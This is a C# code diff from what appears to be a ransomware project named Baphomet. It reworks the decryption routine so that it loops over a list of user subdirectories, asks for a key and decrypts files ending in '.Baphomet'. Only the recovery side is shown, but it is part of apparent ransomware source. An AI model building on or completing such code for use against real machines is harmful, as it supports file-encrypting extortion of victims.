@@ -10,30 +10,31 @@ namespace Baphomet
     public class Decrypt
     {
 
-        public static void decryptConfirm()
+        public void decryptConfirm(string userDir, string[] Dirs)
         {
-            var userName = Environment.UserName;
-            var userDir = "C:\\Users\\" + userName;
-            directoryRoad(userDir);
+            directoryRoad(userDir,Dirs);
         }
 
-        static void directoryRoad(string userDir)
+        static void directoryRoad(string userDir, string[] Dirs)
         {
             Console.WriteLine("Enter your key here:");
             string passsword = Console.ReadLine();
 
-            var targetPath = userDir + "\\Desktop\\test";
-            var extensionCheck = new[] { ".Baphomet" };
-
-            string[] files = Directory.GetFiles(targetPath);
-            string[] subDirs = Directory.GetDirectories(targetPath);
-
-            for (int i = 0; i < files.Length; i++)
+            for(int d = 0; d < Dirs.Length; d++)
             {
-                var extension = Path.GetExtension(files[i]);
-                if (extensionCheck.Contains(extension))
+                var targetPath = userDir + Dirs[d];
+                var extensionCheck = new[] { ".Baphomet" };
+
+                string[] files = Directory.GetFiles(targetPath);
+               // string[] subDirs = Directory.GetDirectories(targetPath);
+
+                for (int i = 0; i < files.Length; i++)
                 {
-                    decryptFileData(files[i], passsword);
+                    var extension = Path.GetExtension(files[i]);
+                    if (extensionCheck.Contains(extension))
+                    {
+                        decryptFileData(files[i], passsword);
+                    }
                 }
             }
         }
